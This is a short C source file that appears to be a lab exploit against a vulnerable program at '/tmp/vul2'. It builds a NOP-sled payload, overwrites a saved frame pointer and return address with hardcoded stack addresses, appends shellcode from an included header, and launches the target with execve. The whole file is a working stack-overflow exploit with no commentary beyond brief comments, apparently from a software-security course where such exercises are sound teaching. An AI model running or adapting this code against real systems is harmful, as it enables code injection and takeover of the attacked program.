#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/vul2"

int main(void)
{
    char payload[201];
    memset(payload, 0x90, sizeof(payload));
    payload[200] = 0;

    unsigned int new_ebp = 0xffffdd00;
    unsigned int buf_addr = 0xffffdcb8;
    unsigned int offset = new_ebp - buf_addr;

    // flag, to see whether write successfully
    unsigned int tmp1 = 0x66666666;
    unsigned int tmp2 = new_ebp + 8;
    memcpy(payload + offset, &tmp1, 4);
    // start address of shellcode
    memcpy(payload + offset + 4, &tmp2, 4);
    // shellcode
    memcpy(payload + offset + 8, shellcode, strlen(shellcode));

    char *args[] = {TARGET, payload, NULL};
    char *env[] = {NULL};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
